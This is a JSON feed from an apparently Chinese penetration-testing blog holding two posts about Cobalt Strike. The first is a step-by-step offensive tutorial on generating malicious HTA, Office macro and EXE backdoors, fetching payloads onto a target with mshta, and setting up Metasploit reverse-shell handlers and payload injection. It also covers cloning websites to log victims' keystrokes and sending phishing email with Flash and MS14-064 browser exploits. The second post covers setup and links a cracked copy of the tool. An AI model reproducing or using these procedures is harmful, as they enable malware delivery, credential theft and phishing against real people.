{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"后渗透\" category",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "url": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "title": "CobaltStrike攻击模块的使用",
            "date_published": "2021-07-07T06:27:57.000Z",
            "content_html": "<h1 id=\"attacks模块简介\"><a class=\"anchor\" href=\"#attacks模块简介\">#</a> Attacks 模块简介</h1>\n<h2 id=\"packages模块\"><a class=\"anchor\" href=\"#packages模块\">#</a> packages 模块</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<blockquote>\n<p>HTML Application:<br />\n 生成一个恶意 HTML Application 木马，后缀格式为 .hta。通过 HTML 调用其他语言的应用组件进行攻击，提供了可执行文件、PowerShell、VBA 三种方法</p>\n</blockquote>\n<blockquote>\n<p>MS Office Macro:<br />\n 生成 office 宏病毒文件；</p>\n</blockquote>\n<blockquote>\n<p>Payload Generator:<br />\n 生成各种语言版本的 payload，可以生成基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等的 payload</p>\n</blockquote>\n<blockquote>\n<p>Windows Executable:<br />\n 生成 32 位或 64 位的 exe 和基于服务的 exe、DLL 等后门程序</p>\n</blockquote>\n<blockquote>\n<p>Windows Executable(S)<br />\n 用于生成一个 exe 可执行文件，其中包含 Beacon 的完整 payload，不需要阶段性的请求。<br />\n与 Windows Executable 模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持 powershell 脚本，可用于将 Stageless Payload 注入内存。</p>\n</blockquote>\n<h2 id=\"web-drive-by-网站钓鱼攻击\"><a class=\"anchor\" href=\"#web-drive-by-网站钓鱼攻击\">#</a> Web Drive-by 网站钓鱼攻击</h2>\n<p>点击中间的 Attacks——&gt; Web Drive-by（网站钓鱼攻击）</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>Manage　　　　　　　　　　 对开启的 web 服务进行管理；<br />\nClone Site 　　 　　　　　克隆网站，可以记录受害者提交的数据；<br />\nHost File 　　　　　　　　提供一个文件下载，可以修改 Mime 信息；Host File 可以配合 DNS 欺骗实现挂马效果使用<br />\n Scripted Web Delivery    基于 Web 的攻击测试脚本，自动生成可执行的 payload ;<br />\nSigned Applet Attack 　　启动一个 Web 服务以提供自签名 Java Applet 的运行环境；<br />\nSmart Applet Attack 　　 自动检测 Java 版本并 l 利用已知的 exploits 绕过 security；<br />\nSystem Profiler　　　　　用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等。<br />\nSpear Phish 　　　　　　　用来邮件钓鱼的模块</p>\n<h1 id=\"cobaltstrike-attacks模块的利用方法\"><a class=\"anchor\" href=\"#cobaltstrike-attacks模块的利用方法\">#</a> CobaltStrike Attacks 模块的利用方法</h1>\n<h2 id=\"msf与cobaltstrike结合获取meterpreter\"><a class=\"anchor\" href=\"#msf与cobaltstrike结合获取meterpreter\">#</a> MSF 与 CobaltStrike 结合获取 meterpreter</h2>\n<p>在 CobaltStrike 中的 Listenter 中有一些 Foreign 的载荷（payload），常用于于 MSF 结合</p>\n<p>创建 Beacon Listener</p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 Foregin (windows/foregin/reverse_http) -&gt;  msf 攻击机 ip/msf 监听端口 (192.168.199.145:4444)</p>\n</blockquote>\n<p>在攻击机上进行 msf 监听</p>\n<blockquote>\n<p>use exploit/multi/handler<br />\nset payload windows/meterpreter/reverse_http<br />\nset lhost 192.168.199.145<br />\nset lport 4444<br />\nrun/exploit</p>\n</blockquote>\n<p>生成攻击文件在目标机器运行既可</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h2 id=\"利用web服务远程加载文件获取beacon\"><a class=\"anchor\" href=\"#利用web服务远程加载文件获取beacon\">#</a> 利用 web 服务，远程加载文件，获取 beacon</h2>\n<p>利用 <code>Attack -&gt;  packeg</code>  中的 <code>HTML Application</code></p>\n<p>一个 <code>HTML Application</code> （HTML 应用）是一个使用 HTML 和一个 Internet 浏览器支持的脚本语言编写的 Windows 程序。该程序包生成一个 HTML 应用，该应用运行一个 <code>Cobalt Strike payload</code> 。你可以选择一个 HTML 应用，此 HTML 应用使得一个可执行文件落地在磁盘上并运行它。选择 <code>powershell</code>  选项来得到一个 HTML 应用，该应用应该使用 <code>Powershell</code>  来运行一个 <code>payload</code></p>\n<p>新建一个 <code>Linsenter</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>创建一个.hta 的恶意文件</p>\n<blockquote>\n<p>Attacks -&gt;  Package -&gt;  HTML Application -&gt;  选择 Listener -&gt;  method 选择 powershell -&gt;  Generate</p>\n</blockquote>\n<p>加载本地文件到服务端，进行 web 服务</p>\n<blockquote>\n<p>Attacks -&gt;  Web Drive-by -&gt;  Host File -&gt;  File 选择本地生成的.hta 文件</p>\n</blockquote>\n<p>目标机 cmd.exe 中运行以下命令（白名单文件 mshta.exe 无免杀，在加载.hta 文件时可被多种杀软查杀)(mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件，或在批处理中结合其他语言的代码；如：mshta javascript，可用于运行一个 HTML 网页而不会出现安全警告。)</p>\n<blockquote>\n<p>mshta <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1pcCstMHkzZTE4OW8vZG93bmxvYWQvZmlsZS5leHQ=\">http://ip + 端口 /download/file.ext</span></p>\n</blockquote>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>靶机上线。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"ms-office-macro-宏获取beacon\"><a class=\"anchor\" href=\"#ms-office-macro-宏获取beacon\">#</a> MS Office Macro 宏获取 beacon</h2>\n<p>利用 Attack -&gt;  Package -&gt;  MS office Macro</p>\n<p><code>MS office Macro</code>  模块提供一个 <code>Microsoft Office</code>  的宏文件，并提供嵌入 <code>Microsoft World</code>  或 <code>Microsoft Excel</code>  的说明</p>\n<p>新建一个 <code>Linsenter</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>利用 <code>MS Office Macro</code>  模块获取宏</p>\n<blockquote>\n<p>Attack -&gt;  Package -&gt;  MS office Macr</p>\n</blockquote>\n<p>将获取的宏嵌入到文档当中</p>\n<blockquote>\n<p>Microsoft World 文档 -&gt;  视图 -&gt;  宏 -&gt;  宏名任意 -&gt;  创建 -&gt;  Microsoft Visual Basic for Application 控制台 -&gt;  将生成的宏复制到代码区 -&gt; 保存</p>\n</blockquote>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>靶机上线。</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"制作钓鱼网址盗取用户输入信息\"><a class=\"anchor\" href=\"#制作钓鱼网址盗取用户输入信息\">#</a> 制作钓鱼网址盗取用户输入信息</h2>\n<p>利用 Attack -&gt;  Web Drive-by -&gt; Clone Site 制作钓鱼网址</p>\n<p>在向目标发送漏洞利用程序之前，进行伪装会有所帮助。 <code>Cobalt Strike</code>  的网站克隆工具可以帮助此目标。网站克隆工具制作一个网站的本地的复制，使用一些增加的代码来修复连接和图像这样它们可以如预期一样工作。</p>\n<p>建立 <code>Linstener</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>利用 <code>Clone Site</code>  获取钓鱼网址</p>\n<blockquote>\n<p>Attack -&gt;  Web Drive-by -&gt; Clone Site -&gt;  Clone Url (被克隆网址) -&gt;  勾选 Log Keystroken on Cloned site</p>\n</blockquote>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>利用网站日志（web Log）查看被钓鱼方输入的信息</p>\n<blockquote>\n<p>View -&gt;  Web Log</p>\n</blockquote>\n<p>如下为被克隆网站</p>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"简单exe等可执行文件上线目标主机\"><a class=\"anchor\" href=\"#简单exe等可执行文件上线目标主机\">#</a> 简单 EXE 等可执行文件上线目标主机</h2>\n<p>利用 Attack -&gt;  Packages -&gt;  Windows Executable/(s)</p>\n<p>该程序包含一个 Windows 可执行 <code>Artifact</code> ，用于传送一个 <code>Payload Stager</code> 。这个程序包为使用者提供了多种输出选项。 <code>Windows Service EXE</code>  是一个 Windows 可执行文件，可响应 <code>Service Control Manager</code>  命令。使用者可以使用这个可执行文件来作为使用 <code>SC</code>  命令行的 Windows 服务的调用程序，或使用 <code>Metasploit</code>  框架的 <code>PsExec</code>  模块生成一个自定义的可执行文件。<br />\n普通的 EXE 和服务器启动调用的 EXE 是由区别的，利用 <code>Windows Service EXE</code>  生成的 EXE 才能用来作为服务自启动的 EXE，利用 <code>Cobalt Strike</code>  中 Windows EXE 生成的 EXE 不能作为服务自启动的 EXE 程序。</p>\n<p>创建一个监听</p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>生成可执行程序</p>\n<blockquote>\n<p>Attack -&gt;  Packages -&gt; windows Executable/(s)</p>\n</blockquote>\n<p>目标机器运行可执行文件，上线目标主机</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>生成 Powershell 版的需要在目标主机的 Powershell 控制台运行该 ps1 脚本<br />\n生成 dll 文件，需要在目标主机加载</p>\n<h2 id=\"利用msf结合cobalt-strike获取cs-beacon\"><a class=\"anchor\" href=\"#利用msf结合cobalt-strike获取cs-beacon\">#</a> 利用 MSF 结合 Cobalt Strike 获取 CS beacon</h2>\n<p>在 0x01 部分，我们知道 Cobalt Strike 可以与 MSF 配合获取 meterpreter，当然，二者也可以相互配合获取 Beacon。</p>\n<p>你可以使用 MSF 中的 <code>exploit/windows/local/payload_inject</code>  模块将 MSF 获取的 <code>meterpreter</code>  传送给 <code>Cobalt Strike</code></p>\n<p>Cobalt Strike 新建一个 <code>Listener</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>MSF 获取目标 <code>meterpreter</code> <br />\n 将 <code>meterpreter</code>  利用 <code>exploit/windows/local/payload_inject</code>  模块传送给 CS</p>\n<blockquote>\n<p>background<br />\nuse exploit/windows/local/payload_inject</p>\n</blockquote>\n<p>设定 CS 的 ip 和监听端口</p>\n<blockquote>\n<p>set LHOST CSip<br />\nset LPORT CS Listener 监听端口<br />\n set disablepayloadhandler true</p>\n</blockquote>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>设定传送的 <code>session</code></p>\n<blockquote>\n<p>set session id</p>\n</blockquote>\n<p>session id 可输入 <code>sessions</code>  查看</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<p>运行即可</p>\n<p><img data-src=\"image013.png\" alt=\"\" /></p>\n<h2 id=\"payload-generatorpayload-生成器\"><a class=\"anchor\" href=\"#payload-generatorpayload-生成器\">#</a> Payload Generator (Payload 生成器)</h2>\n<p>该模块可以生成 n 中语言的后门 Payload，包括 C,C#,Python,Java,Perl,Powershell 脚本，Powershell 命令，Ruby,Raw，免杀框架 Veli 中的 shellcode 等等... 这是 CS 的一个很大的迷人之处。</p>\n<blockquote>\n<p>attack -&gt;  Packages -&gt;  payload Generator</p>\n</blockquote>\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<h2 id=\"cs发送钓鱼邮件\"><a class=\"anchor\" href=\"#cs发送钓鱼邮件\">#</a> CS 发送钓鱼邮件</h2>\n<p>CS 能生成 Office 宏，发现生成的该文件很容易被杀软监测出来，并处理掉，加上它的局限性，在外网实际中意义不大，在内网用效果可能还好。主要是思路。</p>\n<p>实验环境</p>\n<p>虚拟机搭建的邮件服务器地址：192.168.199.133</p>\n<p>Cobalt strike 服务器地址：192.168.199.145</p>\n<p>Kali 虚拟机地址：192.168.199.145</p>\n<p>这里我们应用到一个 flash 插件漏洞的 payloads： <code>adobe_flash_hacking_team_uaf</code></p>\n<p>通过 Cobalt Strike 结合 metasploit 进行实验，如下：</p>\n<p>通过 kali 启用 metasploit。</p>\n<p>配置：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/multi/browser/adobe_flash_hacking_team_uaf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_http</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.199.145</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> disablepayloadhandler <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> prependmigrate <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src=\"image021.png\" alt=\"\" /></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p>执行后如图所示，会得到一个利用地址，记录该地址：</p>\n<p>这里使用</p>\n<p><code>Local IP: http://192.168.199.145:8080/I2bDeFpXx21H</code></p>\n<p>接下来为了方便钓鱼邮件的内容伪造的真实，我们通过 cobalt strike 克隆一个网站。</p>\n<p>进入 Web-Drive-by 选项选择 Clone Site。</p>\n<p>这里提醒下，如果在克隆模块克隆的是 HTTPS 的页面，需要在攻击方加载 SSL 哦，不然没法记录或者执行！(踩坑)</p>\n<p>其中 attack 就是我们 metasploit 中生成的地址链接</p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<p>克隆成功</p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<p>克隆出来的百度</p>\n<p><img data-src=\"image025.png\" alt=\"\" /></p>\n<p>记录的键盘操作</p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<p>克隆出来的百度网页源代码</p>\n<p><img data-src=\"image027.png\" alt=\"\" /></p>\n<p>利用 flash 插件漏洞生成的一个克隆链接成功。</p>\n<p>现在我们进行邮件伪造。</p>\n<p>kali 下创建目标清单 targets.txt<br />\n 注意邮箱和姓名要用 TAB 键隔开，可以是多个邮件地址，每一行一个邮件地址。</p>\n<p><img data-src=\"image028.png\" alt=\"\" /></p>\n<p>创建一个钓鱼模板，可以直接下载一个 eml 文件来使用，这个最好还是逼真一点好。</p>\n<p>配置完毕</p>\n<p><img data-src=\"image029.png\" alt=\"\" /></p>\n<p>发送邮件</p>\n<p><img data-src=\"image030.png\" alt=\"\" /></p>\n<p>邮件发送成功，如果客户端存在 flash 漏洞，等待点击邮件模板里的链接即可跳转到我们的 http://192.168.199.145/search 地址，并通过 flash 漏洞，获取到该终端的权限，该终端会成功上线。</p>\n<p>注意：因为邮件服务器和 CS 服务器都是我在本地虚拟机搭建的，不在公网上的。所以暂时未模拟到真实邮件。</p>\n<h2 id=\"metasploit溢出代码与cobalt-strik配合钓鱼\"><a class=\"anchor\" href=\"#metasploit溢出代码与cobalt-strik配合钓鱼\">#</a> Metasploit 溢出代码与 Cobalt Strik 配合钓鱼</h2>\n<p>拿的是一个针对 XP 或者以下系统，利用 MS14_064 利用 IE 执行远控木马。 主要还是思路。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/windows/browser/ms14_064_ole_code_execution</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvhost <span class=\"token number\">192.168</span>.199.145</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> SRVPORT <span class=\"token number\">6666</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.199.139</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>exploit</pre></td></tr></table></figure><p>生成神秘代码！！</p>\n<p><img data-src=\"image031.png\" alt=\"\" /></p>\n<p>我们再克隆一下百度，放入 Attack</p>\n<p><img data-src=\"image032.png\" alt=\"\" /></p>\n<p>这里就不勾选键盘记录了，因为直接能控制对方了！</p>\n<p><img data-src=\"image033.png\" alt=\"\" /></p>\n<p>生成了网站链接，至于如何让目标访问这个网站，方法还是很多的，比如给目标来一个 ARP+DNS 欺骗，更改 DNS 解析包，强行让目标访问等。</p>\n<p>当目标一访问，这边就上线了。</p>\n<p><img data-src=\"image034.png\" alt=\"\" /></p>\n<p>不过这 IE 确实不行，我复现的这次 IE 直接裂开了……</p>\n<p><img data-src=\"image035.png\" alt=\"\" /></p>\n<p>网上找了个图，凑合着看吧。</p>\n<p><img data-src=\"image036.png\" alt=\"\" /></p>\n<p>通过控制，继续横向渗透即可！</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>总结下思路，就是各种模块之间的配合进行简单的钓鱼，知道这些思路后，还可以和别的钓鱼工具配合，或者是别的方法融合！</p>\n<h1 id=\"强化cobalt-strike\"><a class=\"anchor\" href=\"#强化cobalt-strike\">#</a> 强化 Cobalt strike</h1>\n<p>Cortana 是可以用于 Cobalt strike 以及 Armitage 的脚本，通过加载 cortana 可以向 Cobalt strike 中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制 cortana 脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。</p>\n<p>扩展：</p>\n<p>Aggressor Script 是 Cobalt Strike 3.0 版及更高版本中内置的脚本语言。Aggresor 脚本允许您修改和扩展 Cobalt Strike 客户端。</p>\n<p>Aggressor Script 是 Armitage 中开源脚本引擎 Cortana 的精神继任者。Cortana 是通过 DARPA 的 “网络快速通道” 计划的合同而成为可能的。Cortana 允许其用户通过 Armitage 的团队服务器扩展 Armitage 并控制 Metasploit 框架及其功能。Cobalt Strike 3.0 是对 Cobalt Strike（无 Armitage）基础的完全重写。这一更改提供了重新审视 Cobalt Strike 脚本并围绕 Cobalt Strike 功能构建内容的机会。这项工作的结果是 Aggressor Script。</p>\n<p>也就是说 Cobalt Strike 3.0 版本之后是 Aggressor。</p>\n<p>下载 cortana-scripts：</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvY29ydGFuYS1zY3JpcHRzLmdpdA==\">https://github.com/rsmudge/cortana-scripts.git</span></p>\n</blockquote>\n<h2 id=\"beef\"><a class=\"anchor\" href=\"#beef\">#</a> Beef</h2>\n<p>Beef 是一款针对浏览器的渗透测试工具，而 beef_strick 则是可以在 Cobalt strike 及 Armitage 中加载 Beef 的一个 Cortana 脚本，要使用此脚本，首先要先下载安装 msf 的 beef 插件。</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3hudHJpay9iZWVmbWV0YXNwbG9pdHBsdWdpbi5naXQ=\">https://github.com/xntrik/beefmetasploitplugin.git</span><br />\ncd beefmetasploitplugin<br />\ncp -R lib/* /usr/share/metasploit-framework/lib/<br />\ngem install hpricot<br />\ngem install json</p>\n</blockquote>\n<p>安装依赖库，执行：</p>\n<blockquote>\n<p>gem install hpricot<br />\ngem install json</p>\n</blockquote>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p>启动 msf 加载 beef</p>\n<blockquote>\n<p>msf6 &gt; load beef</p>\n</blockquote>\n<p>若遇到此问题</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>这样解决。</p>\n<blockquote>\n<p>cp -R /var/lib/gems/2.7.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby</p>\n</blockquote>\n<p><img data-src=\"image017.png\" alt=\"\" /></p>\n<p>这里注意若出现以下报错：</p>\n<p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>则要结合自己实际情况，例：查看 gems 目录下的文件名、hpricot-x.x.x。</p>\n<p>现在再启动 msf，就可以加载 beef 了</p>\n<p><img data-src=\"image019.png\" alt=\"\" /></p>\n<h2 id=\"cs免杀-mac写入内存\"><a class=\"anchor\" href=\"#cs免杀-mac写入内存\">#</a> CS 免杀 - MAC 写入内存</h2>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMTEyNzQ2OTk=\">https://blog.csdn.net/qq_34801745/article/details/111274699</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTY3NzAyNy9hcnRpY2xlL2RldGFpbHMvMTEwNzIyMzgy\">https://blog.csdn.net/weixin_39677027/article/details/110722382</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL3ppcmMwbi9lc2NiaGcvcXhnZm51\">https://www.yuque.com/zirc0n/escbhg/qxgfnu</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL2ludHJhbmV0L0NvYmFsdC1TdHJpa2UuaHRtbA==\">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNzcxNjkubmV0L2h0bWwvMjUzMjIxLmh0bWw=\">https://www.77169.net/html/253221.html</span></p>\n",
            "tags": [
                "CobaltStrike"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/",
            "url": "https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/",
            "title": "CobaltStrike的安装和配置",
            "date_published": "2021-07-06T08:58:41.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Cobalt Strike 是一款内网渗透测试工具，常被业界人称为 CS。Cobalt Strike 2.0 版本主要是结合 Metasploit 可以称为图形化 MSF 工具。而 Cobalt Strike 3.0 已经不再使用 Metasploit 框架而作为一个独立的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。客户端模式和服务端模式可以在 Windows 以及 Linux 上运行。<br />\nCobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等</p>\n<h1 id=\"安装cobaltstrike\"><a class=\"anchor\" href=\"#安装cobaltstrike\">#</a> 安装 CobaltStrike</h1>\n<p>有能力的可以支持一下正版 Cobalt Strike 官网: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbQ==\">https://www.cobaltstrike.com</span>。</p>\n<p>没有能力我们就用学 (po) 习 (jie) 版。</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWZiMXBTTmZGVWFjT2hxVlQ5b3BsaEE=\">https://pan.baidu.com/s/1fb1pSNfFUacOhqVT9oplhA</span><br />\n 提取码：rolr</p>\n<p>这个是 Linux 版本<br />\n下载解压后文件如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"目录结构\"><a class=\"anchor\" href=\"#目录结构\">#</a> 目录结构</h1>\n<pre><code>│  cobaltstrike.jar 【主体程序、客户端启动程序】\n│  teamserver  【Linux服务端启动程序(linux shell脚本)】\n|─third-party 第三方工具 【vnc远程功能的dll】\n|        README.vncdll.txt\n|        winvnc.x64.dll 【vnc服务端dllx64位】\n|        winvnc.x86.dll 【vnc服务端dllx86位】\n│  agscript 【拓展应用的脚本】\n│  c2lint  【检查c2配置文件的语法和预览】\n|  peclone 【用来解析dll】\n</code></pre>\n<h1 id=\"客户端与服务端的连接\"><a class=\"anchor\" href=\"#客户端与服务端的连接\">#</a> 客户端与服务端的连接</h1>\n<p>Cobalt Strike 使用 C/S 架构，Cobalt Strike 的客户端连接到团队服务器，团队服务器连接到目标，也就是说 Cobalt Strike 的客户端不与目标服务器进行交互。</p>\n<h2 id=\"启动服务端\"><a class=\"anchor\" href=\"#启动服务端\">#</a> 启动服务端</h2>\n<p>cobaltstrike.jar 既是服务端程序也是客户端程序，一般情况 Linux 用 teamserver 启动服务端。</p>\n<pre><code>teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]\n\n    &lt;host&gt; is the (default) IP address of this Cobalt Strike team server\n    &lt;password&gt; is the shared password to connect to this server\n    [/path/to/c2.profile] is your Malleable C2 profile\n    [YYYY-MM-DD] is a kill date for Beacon payloads run from this server\n</code></pre>\n<p>第一个参数为服务器监听 IP 地址 此选项为必填选项</p>\n<p>第二个参数为服务器连接密码客户端使用此密码连接服务器 此选项为必填选项</p>\n<p>第三个参数为 Malleable C2 profile 配置文件如果不使用可以不用填写 此选项为可选选项<br />\n这是开源的 Malleable C2 profile 文件<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvTWFsbGVhYmxlLUMyLVByb2ZpbGVz\"> https://github.com/rsmudge/Malleable-C2-Profiles</span></p>\n<p>第四个参数为 Beacon 有效负载运行结束日期。如果设置此选项则 CS 生成的每个 Beacon stage 中都将嵌入此结束日期，Beacon payload 在此日期后将拒绝运行，处于 sleep 状态的 Beacon payload 醒来后也将自动退出结束运行 此选项为可选选项</p>\n<p>例:<img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"启动客户端\"><a class=\"anchor\" href=\"#启动客户端\">#</a> 启动客户端</h2>\n<p>使用此命令可以直接运行</p>\n<p><code>java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>\n<p>为了方便我们把这句话保存在 <code>start.sh</code>  的 shell 脚本里面。</p>\n<p>当 Cobalt Strike 客户端启动时，你会看到一个连接对话框</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>输入主机 ip，连接端口 (默认 50050)，以及你想使用的用户名和服务端启动时设置的密码然后点击连接就可以连接到服务器了。</p>\n<p>点击 Connect 连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击 Yes，随后即可打开 CS 客户端界面</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>在连接后，团队之间就可以通过客户端进行沟通，信息共享。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n",
            "tags": [
                "CobaltStrike"
            ]
        }
    ]
}